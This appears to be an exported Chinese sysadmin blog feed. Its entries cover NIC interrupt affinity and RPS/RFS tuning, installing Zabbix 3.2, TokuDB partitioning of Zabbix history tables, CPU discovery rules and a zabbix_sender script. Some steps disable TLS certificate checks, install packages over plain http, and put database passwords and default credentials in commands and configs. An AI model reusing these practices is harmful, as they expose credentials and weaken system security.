</code></pre><h5 id="CPU位掩码计算"><a href="#CPU位掩码计算" class="headerlink" title="CPU位掩码计算"></a>CPU位掩码计算</h5><p>一个十六进制f转换成二进制为1111，每一位表示一个CPU核，最靠右值是最低位即CPU0</p>
<pre>
           Binary       Hex
   CPU 0    0001         1
   CPU 1    0010         2
   CPU 2    0100         4
   CPU 3    1000         8
   其中十六进制2就表示CPU1，十六进制8就表示CPU3

           Binary       Hex
   CPU 0    0001         1
 + CPU 2    0100         4
   -----------------------
   both     0101         5
   其中得出的十六进制和5表示CPU0 和CPU2

           Binary       Hex
   CPU 0    0001         1
   CPU 1    0010         2
   CPU 2    0100         4
 + CPU 3    1000         8
   -----------------------
   both     1111         f
   4个CPU参与中断，即可设置为f，8个CPU参与中断可设置为ff，以此类推
</pre>

<h5 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h5><pre>
过滤eth0中断号，绑定到0-7号CPU核上（eth0-fp命名可能有所不同）:
root@geekwolf:~# grep eth0-fp /proc/interrupts |awk '{print $1, $NF}'
147: eth0-fp-0
148: eth0-fp-1
149: eth0-fp-2
150: eth0-fp-3
151: eth0-fp-4
152: eth0-fp-5
153: eth0-fp-6
154: eth0-fp-7

echo 1  >/proc/irq/147/smp_affinity
echo 2  >/proc/irq/148/smp_affinity
echo 4  >/proc/irq/149/smp_affinity
echo 8  >/proc/irq/150/smp_affinity
echo 10 >/proc/irq/151/smp_affinity
echo 20 >/proc/irq/152/smp_affinity
echo 40 >/proc/irq/153/smp_affinity
echo 80 >/proc/irq/154/smp_affinity
可以通过top命令查看%si是否均衡分摊到0-7核CPU

</pre>

<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ol>
<li>启动irqbalance后，手动绑定将失效</li>
<li>当CPU工作在最高性能模式时，irqbalance会均匀分配中断到其他CPU，节能模式时中断会集中分配到CPU0</li>
<li>以上设置均以网卡支持多队列为前提，建议手动绑定SMP IRQ affinity</li>
<li>网卡多队列需tg3,bnx2,bnx2x,b44等驱动的支持，Broadcom的网卡驱动已经内置在内核中向后兼容大部分的2.6内核及大于2.4.24的2.4内核</li>
<li>笔者实际测试过程中遇到BladeCenter HS23刀片服务器Emulex Corporation OneConnect 10Gb NIC (be3)本身支持多队列，在连接到千兆网环境下无法使用多队列问题，万兆网络下可以使用，只好通过下面RPS/RFS方式实现</li>
</ol>
<h4 id="RPS-RFS"><a href="#RPS-RFS" class="headerlink" title="RPS/RFS"></a>RPS/RFS</h4><p>Receive Packet Steering/Receive Flow Streering,软件方式实现CPU均衡，接收包中断的优化<br>RPS: 网卡驱动对每一个数据库包根据四元组(SIP,SPORT,DIP,DPORT)生成HASH值,通过HASH值将每个连接和CPU 绑定<br>RFS： 由于RPS只是单纯的把数据包均衡到不同的CPU上，此时如果应用程序所在CPU和中断处理的CPU不在同一个核，将会对CPU Cache影响很大，RFS的作用就是将应用程序和软中断处理分配到同一个CPU<br>配置步骤:</p>
<p>根据上述说明一个十六进制f表示四个CPU核，那么均衡到32核即ffffffff</p>
<h5 id="配置RPS"><a href="#配置RPS" class="headerlink" title="配置RPS"></a>配置RPS</h5><pre>
rps_cpus='ffffffffff'
for rxdir in /sys/class/net/eth0/queues/rx-*
do
    echo $rps_cpus >$rxdir/rps_cpus

done
</pre>

<h5 id="配置RFS"><a href="#配置RFS" class="headerlink" title="配置RFS"></a>配置RFS</h5><p>RFS扩展了RPS的性能以增加CPU缓存命中率，减少网络延迟,默认是禁用的<br><code>⁠
/proc/sys/net/core/rps_sock_flow_entries
设置此文件至同时活跃连接数的最大预期值。对于中等服务器负载，推荐值为 32768 。所有输入的值四舍五入至最接近的2的幂
/sys/class/net/device/queues/rx-queue/rps_flow_cnt
将 device 改为想要配置的网络设备名称（例如，eth0），将 rx-queue 改为想要配置的接收队列名称（例如，rx-0）。
将此文件的值设为 rps_sock_flow_entries 除以 N，其中 N 是设备中接收队列的数量。例如，如果 rps_flow_entries 设为 32768，并且有 16 个配置接收队列，那么 rps_flow_cnt 就应设为 2048。对于单一队列的设备，rps_flow_cnt 的值和 rps_sock_flow_entries 的值是一样的</code></p>
<pre>
ls /sys/class/net/eth0/queues/rx-*|grep queues|wc -l
8

rps_flow_cnt=32768/8=4096
echo 32768 >/proc/sys/net/core/rps_sock_flow_entries
for rxdir in /sys/class/net/eth0/queues/rx-*
do
    echo $rps_cpus >$rxdir/rps_cpus
    echo $rps_flow_cnt >$rxdir/rps_flow_cnt
done

echo 32768 >/proc/sys/net/core/rps_sock_flow_entries
</pre>

<p>优化脚本可参考: <a href="https://github.com/geekwolf/sa-scripts/blob/master/ops-scripts/performance_tuning/set_rps.sh" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/ops-scripts/performance_tuning/set_rps.sh</a></p>
<h4 id="网卡常规优化方案"><a href="#网卡常规优化方案" class="headerlink" title="网卡常规优化方案"></a>网卡常规优化方案</h4><p><img src="http://www.simlinux.com/wp-content/uploads/2017/02/net_stack.jpg" alt=""><br>关于发包的优化XPS 还未做测试，有时间在做补充！</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<ul>
<li>TCP/UDP压测工具netperf  <a href="https://sanwen8.cn/p/P8bHgn.html" target="_blank" rel="external">https://sanwen8.cn/p/P8bHgn.html</a></li>
<li>多队列网卡及网卡中断绑定阐述  <a href="http://www.ywnds.com/?p=4380" target="_blank" rel="external">http://www.ywnds.com/?p=4380</a></li>
<li>Netperf压测数据分析   <a href="http://www.docin.com/p-1654134152.html" target="_blank" rel="external">http://www.docin.com/p-1654134152.html</a></li>
<li>RHEL7.0 Performance_Tuning_Guide  <a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Performance_Tuning_Guide/" target="_blank" rel="external">https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Performance_Tuning_Guide/</a></li>
<li>RPS/RFS/RSS 性能测试 <a href="http://www.cnblogs.com/Bozh/archive/2013/03/21/2973769.html" target="_blank" rel="external">http://www.cnblogs.com/Bozh/archive/2013/03/21/2973769.html</a></li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos6.5部署Zabbix3.2(备忘)]]></title>
      <url>/2016/12/17/centos6-5-e9-83-a8-e7-bd-b2zabbix3-2-e5-a4-87-e5-bf-98.html</url>
      <content type="html"><![CDATA[<p><strong>1.配置yum源</strong></p>
<pre><code>wget --no-check-certificate http://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/epel?codeblock=0 -O epel.repo
wget --no-check-certificate http://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/epel?codeblock=1 -O epel-testing.repo
yum install  -y http://www.percona.com/downloads/percona-release/redhat/0.1-3/percona-release-0.1-3.noarch.rpm
rpm -Uvh http://mirror.webtatic.com/yum/el6/latest.rpm 
`&lt;/pre&gt;

**2.安装LNMP环境及依赖包**

&lt;pre&gt;`yum -y install nginx Percona-Server-server-57 Percona-Server-client-57 Percona-Server-devel-57 Percona-Server-tokudb-57  php56w php56w-fpm php56w-mysql gcc-c++ libxml2-devel net-snmp-devel  libcurl-devel fping php56w-bcmath php56w-mbstring php56w-gd php56w-xmlwriter php56w-xmlreader
`&lt;/pre&gt;

**3.数据库初始化，支持TokuDB**

&lt;pre&gt;`数据库初始化
mysqld --initialize-insecure --user=mysql --datadir=/data/mysql/data/
启用TokuDB
ps_tokudb_admin --enable -uroot -pgeekwolf

若无法加载tokudb引擎，请查看huge pages是否关闭：
echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/enabled
echo never &amp;gt; /sys/kernel/mm/transparent_hugepage/defrag
`&lt;/pre&gt;

**4.安装Zabbix**

&lt;pre&gt;`wget https://nchc.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.2.2/zabbix-3.2.2.tar.gz
groupadd zabbix
useradd -g zabbix -s /sbin/nologin
tar xf zabbix-3.2.2.tar.gz
./configure --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2
make -j8
make install

`&lt;/pre&gt;

**5.配置zabbix_agent**

&lt;pre&gt;`vim /usr/local/etc/zabbix_agentd.conf
PidFile=/tmp/zabbix_agentd.pid
LogFile=/tmp/zabbix_agentd.log
LogFileSize=0
Server=192.168.1.1
ServerActive=192.168.1.1
Hostname=192.168.1.2
UnsafeUserParameters=1
`&lt;/pre&gt;

**6.配置zabbix_server
**

&lt;pre&gt;`vim /usr/local/etc/zabbix_server.conf
DBHost=192.168.1.1
DBName=zabbix
DBUser=zabbix
DBPassword=zabbix
DebugLevel=3
StartPollers=80
CacheSize=32M
TrendCacheSize=32M
HistoryCacheSize=32M
LogFile=/tmp/zabbix_server.log
AlertScriptsPath=/usr/local/etc/scripts
FpingLocation=/usr/bin/fping
StartPingers=20
HousekeepingFrequency=1
MaxHousekeeperDelete=10000
Timeout=10
`&lt;/pre&gt;

**7.拷贝Zabbix FrontEnd，创建数据库,修改php.ini配置**

&lt;pre&gt;`cd  zabbix-3.2.2/
cp frontends/php/* /usr/share/zabbix/
chown apache.apache /usr/share/zabbix -R
mysql&amp;gt;create database zabbix;
mysql&amp;gt;source database/mysql/schema.sql;
mysql&amp;gt;source database/mysql/images.sql;
mysql&amp;gt;source database/mysql/data.sql;
拷贝启动脚本:
cp  misc/init.d/fedora/core5/* /etc/rc.d/init.d/
配置Nginx:
vim /etc/nginx/conf.d/zabbix.conf
server {
    listen 80;
    server_name zbx.simlinux.com;
    index index.html index.php;
    root /usr/share/zabbix;
    location ~ \.php$ {
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }
}

`&lt;/pre&gt;

启动agent和server服务：

&lt;pre&gt;`service zabbix_agentd start
service zabbix_server start
service nginx reload
`&lt;/pre&gt;

修改php.ini配置:

&lt;pre&gt;`always_populate_raw_post_data = -1
max_execution_time = 300
max_input_time = 300
data.timezone = PRC 
post_max_size=16M
service php-fpm reload
`&lt;/pre&gt;

**8.修改数据表引擎和创建分区表**

&lt;pre&gt;`alter table history engines=&apos;tokudb&apos;;
alter table history_log engines=&apos;tokudb&apos;;
alter table history_str engines=&apos;tokudb&apos;;
alter table history_text engines=&apos;tokudb&apos;;
alter table trends engines=&apos;tokudb&apos;;
</code></pre><p>分区表可参考<a href="http://www.simlinux.com/archives/1776.html">http://www.simlinux.com/archives/1776.html</a></p>
<p><strong>9.安装Zabbix Web</strong><br>访问<a href="http://192.168.1.1" target="_blank" rel="external">http://192.168.1.1</a> 进行安装,默认账号密码: admin zabbix</p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/zbx.png" alt=""></p>
<p><strong>10.遇到的问题</strong><br>A. Zabbix设置中文显示时，图形部分字体显示方框<br> <img src="http://www.simlinux.com/wp-content/uploads/2016/12/zbx-q1.png" alt=""></p>
<p>解决方法：<br>Zabbix默认使用DejaVuSan.ttf字体，不支持中文<br>拷贝本地C:\Windows\Fonts下的微软雅黑字体上传到Zabbix Web目录fonts下,即msyh.ttf<br>sed -i ‘s/DejaVuSans/msyh/g’ ./include/defines.inc.php</p>
<p>B. Zabbix_server日志提示20434:20161217:105010.997 fping failed: fping6: Address family for hostname not supported<br>解决方法:<br>zabbix_server.conf中指定fping和fping6路径<br>FpingLocation=/usr/sbin/fping<br>Fping6Location=/usr/sbin/fping6</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix数据库优化总结]]></title>
      <url>/2016/12/10/zabbix-e6-95-b0-e6-8d-ae-e5-ba-93-e4-bc-98-e5-8c-96-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<blockquote>
<ul>
<li><strong>目的:</strong> 快速清理历史数据，并减少数据存储容量</li>
<li><strong>方法</strong>: 历史表使用分区表(删除分区表速度快),使用Tokudb引擎(适合大量insert少量update和select等日志表)</li>
<li><strong>Zabbix版本:</strong> 2.4</li>
<li><strong>涉及表项:</strong><br>存储不同类型item的历史数据，最终1小时或者1天等段时间的绘图数据从其中获取<br>history、history_log、history_str、history_text、history_uint<br>存储不同类型item的历史趋势数据，每隔一小时从历史数据中统计一次，并计算统计区间的平均值，最大值，最小值trends、trends_uint</li>
</ul>
</blockquote>
<p><strong>具体操作步骤:</strong></p>
<p><strong>1.关闭zabbix的housekeeper功能</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/housekeeper.jpg" alt=""></p>
<p><strong>2.备份原有历史数据表</strong></p>
<pre><code>rename table history to history_bak;
rename table history_log to history_log_bak;
rename table history_str to history_str_bak;
rename table history_text to history_text_bak;
rename table history_unit to history_unit_bak;
rename table trends to trends_bak;
rename table trends_unit to trends_unit_bak;
`&lt;/pre&gt;

**3.创建新表(使用tokudb引擎)**

&lt;pre&gt;`CREATE TABLE `history` (
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,
  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,
  KEY `history_1` (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
 CREATE TABLE `history_log` (
  `id` bigint(20) unsigned NOT NULL,
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `timestamp` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `source` varchar(64) NOT NULL DEFAULT &apos;&apos;,
  `severity` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value` text NOT NULL,
  `logeventid` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,
  PRIMARY KEY (`id`),
  UNIQUE KEY `history_log_2` (`itemid`,`id`),
  KEY `history_log_1` (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
CREATE TABLE `history_str` (
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value` varchar(255) NOT NULL DEFAULT &apos;&apos;,
  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,
  KEY `history_str_1` (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
CREATE TABLE `history_text` (
  `id` bigint(20) unsigned NOT NULL,
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value` text NOT NULL,
  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,
  PRIMARY KEY (`id`),
  UNIQUE KEY `history_text_2` (`itemid`,`id`),
  KEY `history_text_1` (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
CREATE TABLE `history_uint` (
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,
  `ns` int(11) NOT NULL DEFAULT &apos;0&apos;,
  KEY `history_uint_1` (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
CREATE TABLE `trends` (
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `num` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value_min` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,
  `value_avg` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,
  `value_max` double(16,4) NOT NULL DEFAULT &apos;0.0000&apos;,
  PRIMARY KEY (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
CREATE TABLE `trends_uint` (
  `itemid` bigint(20) unsigned NOT NULL,
  `clock` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `num` int(11) NOT NULL DEFAULT &apos;0&apos;,
  `value_min` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,
  `value_avg` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,
  `value_max` bigint(20) unsigned NOT NULL DEFAULT &apos;0&apos;,
  PRIMARY KEY (`itemid`,`clock`)
) ENGINE=Tokudb DEFAULT CHARSET=utf8；
`&lt;/pre&gt;

**4.更改索引结构（新版本无需更改）**

&lt;pre&gt;`ALTER TABLE history_text DROP PRIMARY KEY,
 ADD INDEX (id),
 DROP INDEX history_text_2,
 ADD INDEX history_text_2 (itemid, id);
ALTER TABLE history_log DROP PRIMARY KEY,
 ADD INDEX (id),
 DROP INDEX history_log_2,
 ADD INDEX history_log_2 (itemid, id);
`&lt;/pre&gt;

**5.创建存储过程**

&gt; *   partition_create 增加分区存储过程
</code></pre><blockquote>
<ul>
<li>partition_drop 删除分区存储过程</li>
<li>partition_maintenance 分区维护(创建删除逻辑)存储过程</li>
<li>partition_maintenance_all 分区维护(调用partition_maintenance )</li>
<li>partition_verify 检查分区、创建第一个分区的存储过程</li>
</ul>
</blockquote>
<pre><code>&lt;pre&gt;`**************************************partition_create**************************************
DELIMITER $$
CREATE PROCEDURE `partition_create`(SCHEMANAME varchar(64), TABLENAME varchar(64), PARTITIONNAME varchar(64), CLOCK int)
BEGIN
        /*
           SCHEMANAME = The DB schema in which to make changes
           TABLENAME = The table with partitions to potentially delete
           PARTITIONNAME = The name of the partition to create
        */
        /*
           Verify that the partition does not already exist
        */

        DECLARE RETROWS INT;
        SELECT COUNT(1) INTO RETROWS
        FROM information_schema.partitions
        WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND partition_description &amp;gt;= CLOCK;

        IF RETROWS = 0 THEN
                /*
                   1\. Print a message indicating that a partition was created.
                   2\. Create the SQL to create the partition.
                   3\. Execute the SQL from #2.
                */
                SELECT CONCAT( &quot;partition_create(&quot;, SCHEMANAME, &quot;,&quot;, TABLENAME, &quot;,&quot;, PARTITIONNAME, &quot;,&quot;, CLOCK, &quot;)&quot; ) AS msg;
                SET @sql = CONCAT( &apos;ALTER TABLE &apos;, SCHEMANAME, &apos;.&apos;, TABLENAME, &apos; ADD PARTITION (PARTITION &apos;, PARTITIONNAME, &apos; VALUES LESS THAN (&apos;, CLOCK, &apos;));&apos; );
                PREPARE STMT FROM @sql;
                EXECUTE STMT;
                DEALLOCATE PREPARE STMT;
        END IF;
END$$
DELIMITER ;
**************************************partition_drop**************************************
DELIMITER $$
CREATE PROCEDURE `partition_drop`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), DELETE_BELOW_PARTITION_DATE BIGINT)
BEGIN
        /*
           SCHEMANAME = The DB schema in which to make changes
           TABLENAME = The table with partitions to potentially delete
           DELETE_BELOW_PARTITION_DATE = Delete any partitions with names that are dates older than this one (yyyy-mm-dd)
        */
        DECLARE done INT DEFAULT FALSE;
        DECLARE drop_part_name VARCHAR(16);

        /*
           Get a list of all the partitions that are older than the date
           in DELETE_BELOW_PARTITION_DATE.  All partitions are prefixed with
           a &quot;p&quot;, so use SUBSTRING TO get rid of that character.
        */
        DECLARE myCursor CURSOR FOR
                SELECT partition_name
                FROM information_schema.partitions
                WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND CAST(SUBSTRING(partition_name FROM 2) AS UNSIGNED) &amp;lt; DELETE_BELOW_PARTITION_DATE;
        DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;

        /*
           Create the basics for when we need to drop the partition.  Also, create
           @drop_partitions to hold a comma-delimited list of all partitions that
           should be deleted.
        */
        SET @alter_header = CONCAT(&quot;ALTER TABLE &quot;, SCHEMANAME, &quot;.&quot;, TABLENAME, &quot; DROP PARTITION &quot;);
        SET @drop_partitions = &quot;&quot;;

        /*
           Start looping through all the partitions that are too old.
        */
        OPEN myCursor;
        read_loop: LOOP
                FETCH myCursor INTO drop_part_name;
                IF done THEN
                        LEAVE read_loop;
                END IF;
                SET @drop_partitions = IF(@drop_partitions = &quot;&quot;, drop_part_name, CONCAT(@drop_partitions, &quot;,&quot;, drop_part_name));
        END LOOP;
        IF @drop_partitions != &quot;&quot; THEN
                /*
                   1\. Build the SQL to drop all the necessary partitions.
                   2\. Run the SQL to drop the partitions.
                   3\. Print out the table partitions that were deleted.
                */
                SET @full_sql = CONCAT(@alter_header, @drop_partitions, &quot;;&quot;);
                PREPARE STMT FROM @full_sql;
                EXECUTE STMT;
                DEALLOCATE PREPARE STMT;

                SELECT CONCAT(SCHEMANAME, &quot;.&quot;, TABLENAME) AS `table`, @drop_partitions AS `partitions_deleted`;
        ELSE
                /*
                   No partitions are being deleted, so print out &quot;N/A&quot; (Not applicable) to indicate
                   that no changes were made.
                */
                SELECT CONCAT(SCHEMANAME, &quot;.&quot;, TABLENAME) AS `table`, &quot;N/A&quot; AS `partitions_deleted`;
        END IF;
END$$
DELIMITER ;
**************************************partition_verify**************************************
DELIMITER $$
CREATE PROCEDURE `partition_verify`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), HOURLYINTERVAL INT(11))
BEGIN
        DECLARE PARTITION_NAME VARCHAR(16);
        DECLARE RETROWS INT(11);
        DECLARE FUTURE_TIMESTAMP TIMESTAMP;

        /*
         * Check if any partitions exist for the given SCHEMANAME.TABLENAME.
         */
        SELECT COUNT(1) INTO RETROWS
        FROM information_schema.partitions
        WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND partition_name IS NULL;

        /*
         * If partitions do not exist, go ahead and partition the table
         */
        IF RETROWS = 1 THEN
                /*
                 * Take the current date at 00:00:00 and add HOURLYINTERVAL to it.  This is the timestamp below which we will store values.
                 * We begin partitioning based on the beginning of a day.  This is because we don&apos;t want to generate a random partition
                 * that won&apos;t necessarily fall in line with the desired partition naming (ie: if the hour interval is 24 hours, we could
                 * end up creating a partition now named &quot;p201403270600&quot; when all other partitions will be like &quot;p201403280000&quot;).
                 */
                SET FUTURE_TIMESTAMP = TIMESTAMPADD(HOUR, HOURLYINTERVAL, CONCAT(CURDATE(), &quot; &quot;, &apos;00:00:00&apos;));
                SET PARTITION_NAME = DATE_FORMAT(CURDATE(), &apos;p%Y%m%d%H00&apos;);

                -- Create the partitioning query
                SET @__PARTITION_SQL = CONCAT(&quot;ALTER TABLE &quot;, SCHEMANAME, &quot;.&quot;, TABLENAME, &quot; PARTITION BY RANGE(`clock`)&quot;);
                SET @__PARTITION_SQL = CONCAT(@__PARTITION_SQL, &quot;(PARTITION &quot;, PARTITION_NAME, &quot; VALUES LESS THAN (&quot;, UNIX_TIMESTAMP(FUTURE_TIMESTAMP), &quot;));&quot;);

                -- Run the partitioning query
                PREPARE STMT FROM @__PARTITION_SQL;
                EXECUTE STMT;
                DEALLOCATE PREPARE STMT;
        END IF;
END$$
DELIMITER ;
**************************************partition_maintenance**************************************
DELIMITER $$
CREATE PROCEDURE `partition_maintenance`(SCHEMA_NAME VARCHAR(32), TABLE_NAME VARCHAR(32), KEEP_DATA_DAYS INT, HOURLY_INTERVAL INT, CREATE_NEXT_INTERVALS INT)
BEGIN
        DECLARE OLDER_THAN_PARTITION_DATE VARCHAR(16);
        DECLARE PARTITION_NAME VARCHAR(16);
        DECLARE OLD_PARTITION_NAME VARCHAR(16);
        DECLARE LESS_THAN_TIMESTAMP INT;
        DECLARE CUR_TIME INT;

        CALL partition_verify(SCHEMA_NAME, TABLE_NAME, HOURLY_INTERVAL);
        SET CUR_TIME = UNIX_TIMESTAMP(DATE_FORMAT(NOW(), &apos;%Y-%m-%d 00:00:00&apos;));

        SET @__interval = 1;
        create_loop: LOOP
                IF @__interval &amp;gt; CREATE_NEXT_INTERVALS THEN
                        LEAVE create_loop;
                END IF;

                SET LESS_THAN_TIMESTAMP = CUR_TIME + (HOURLY_INTERVAL * @__interval * 3600);
                SET PARTITION_NAME = FROM_UNIXTIME(CUR_TIME + HOURLY_INTERVAL * (@__interval - 1) * 3600, &apos;p%Y%m%d%H00&apos;);
                IF(PARTITION_NAME != OLD_PARTITION_NAME) THEN
                        CALL partition_create(SCHEMA_NAME, TABLE_NAME, PARTITION_NAME, LESS_THAN_TIMESTAMP);
                END IF;
                SET @__interval=@__interval+1;
                SET OLD_PARTITION_NAME = PARTITION_NAME;
        END LOOP;

        SET OLDER_THAN_PARTITION_DATE=DATE_FORMAT(DATE_SUB(NOW(), INTERVAL KEEP_DATA_DAYS DAY), &apos;%Y%m%d0000&apos;);
        CALL partition_drop(SCHEMA_NAME, TABLE_NAME, OLDER_THAN_PARTITION_DATE);

END$$
DELIMITER ;
**************************************partition_maintenance_all**************************************
DELIMITER $$
CREATE PROCEDURE `partition_maintenance_all`(SCHEMA_NAME VARCHAR(32))
BEGIN
      CALL partition_maintenance(SCHEMA_NAME, &apos;history&apos;, 90, 24, 30);
      #针对zabbix数据库（调用时传入zabbix数据库的库名）的history表创建分区，数据保留90天，分区时间间隔为24小时，每次创建30个分区
      CALL partition_maintenance(SCHEMA_NAME, &apos;history_log&apos;, 90, 24, 30);
      CALL partition_maintenance(SCHEMA_NAME, &apos;history_str&apos;, 90, 24, 30);
      CALL partition_maintenance(SCHEMA_NAME, &apos;history_text&apos;, 90, 24, 30);
      CALL partition_maintenance(SCHEMA_NAME, &apos;history_uint&apos;, 90, 24, 30);
      CALL partition_maintenance(SCHEMA_NAME, &apos;trends&apos;, 730, 24, 15);
      CALL partition_maintenance(SCHEMA_NAME, &apos;trends_uint&apos;, 730, 24, 30);
END$$
DELIMITER ;
`&lt;/pre&gt;

**6.设置分区表维护Event Scheduler**

&lt;pre&gt;`开启数据库Event Scheduler功能
set GLOBAL event_scheduler=ON;
创建事件zbx_partition_maintenance 每月1号1点执行partition_maintenance_all:
DELIMITER $$
CREATE EVENT `zbx_partition_maintenance`
ON SCHEDULE every 1 month starts date_add(date_add(date_sub(curdate(),interval day(curdate())-1 day),interval 1 month),interval 1 HOUR)
ON COMPLETION PRESERVE DO
BEGIN
    CALL partition_maintenance_all(&apos;zabbix&apos;) ; 
END$$
DELIMITER ;
</code></pre>]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[zabbix LLD之多核CPU监控(备忘)]]></title>
      <url>/2016/12/10/zabbix-lld-e4-b9-8b-e5-a4-9a-e6-a0-b8cpu-e7-9b-91-e6-8e-a7-e5-a4-87-e5-bf-98.html</url>
      <content type="html"><![CDATA[<blockquote>
<ul>
<li><em>使用Zabbix自带的system.cpu.discovery实现CPU多核监控</em></li>
<li><em>Zabbix Agent 2.4+以上版本才开始支持</em></li>
</ul>
</blockquote>
<p><strong>一、创建发现规则</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/cpu_multi.jpg" alt=""></p>
<p><strong>二、创建监控项</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/cpu_item.png" alt=""></p>
<p><strong>三、根据监控项创建图形</strong></p>
<p><strong>四、创建触发器</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/cpu_trigger.png" alt=""></p>
<p><strong>五、展示效果</strong></p>
<p><img src="http://www.simlinux.com/wp-content/uploads/2016/12/cpu-core-pic.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[通过zabbix_sender实现批量传递key值(备忘)]]></title>
      <url>/2016/10/26/e9-80-9a-e8-bf-87zabbix-sender-e5-ae-9e-e7-8e-b0-e6-89-b9-e9-87-8f-e4-bc-a0-e9-80-92key-e5-80-bc.html</url>
      <content type="html"><![CDATA[<p>选择使用zabbix_sender的由来基于业务中需要从MySQL数据库中提取游戏在线人数(5个服务)，如果通过zabbix_get方式获取需要执行5次脚本获取，而通过zabbix_sender执行一次脚本可将5个服务的数据批量发送到zabbix trapper更为方便，减少了不必要的脚本执行</p>
<p><strong>配置步骤如下:</strong></p>
<p><strong>1.配置zabbix_agentd.conf 自定义UserParameter</strong></p>
<pre><code>UserParameter=send.online.count.data[*],/home/opt/scripts/online_count.sh $1
/etc/init.d/zabbix_agent stop
/etc/init.d/zabbix_agent start
`&lt;/pre&gt;

注释: 此步骤的目的是在zabbix server上创建key为send.online.count.data的item用于设置脚本的执行间隔，也可以在zabbix agent服务上设置crontab实现

**2.数据获取脚本**

&lt;pre&gt;`#!/bin/bash
host_ip=$1
zabbix_server_ip=&quot;10.1.1.1&quot;
mysql  -C -N  -h localhost -u geekwolf -pgeekwolf &quot;--execute=select total,dota,war3vs,war3rpg,first_login from online_table;&quot;&amp;gt;/tmp/.data
Total=`cat /tmp/.data |awk &apos;{print $1}&apos;`
Dota=`cat /tmp/.data |awk &apos;{print $2}&apos;`
War3vs=`cat /tmp/.data |awk &apos;{print $3}&apos;`
War3rpg=`cat /tmp/.data |awk &apos;{print $4}&apos;`
First_Login=`cat /tmp/.data |awk &apos;{print $5}&apos;`

echo &quot;$host_ip online_count[Total] $Total&quot; &amp;gt;/tmp/count.log
echo &quot;$host_ip online_count[Dota] $Dota&quot; &amp;gt;&amp;gt;/tmp/count.log
echo &quot;$host_ip online_count[War3vs] $War3vs&quot; &amp;gt;&amp;gt;/tmp/count.log
echo &quot;$host_ip online_count[War3rpg] $War3rpg&quot; &amp;gt;&amp;gt;/tmp/count.log
echo &quot;$host_ip online_count[First_login] $First_Login&quot; &amp;gt;&amp;gt;/tmp/count.log
zabbix_sender -z $zabbix_server_ip -i /tmp/count.log &amp;amp;&amp;gt;/dev/null
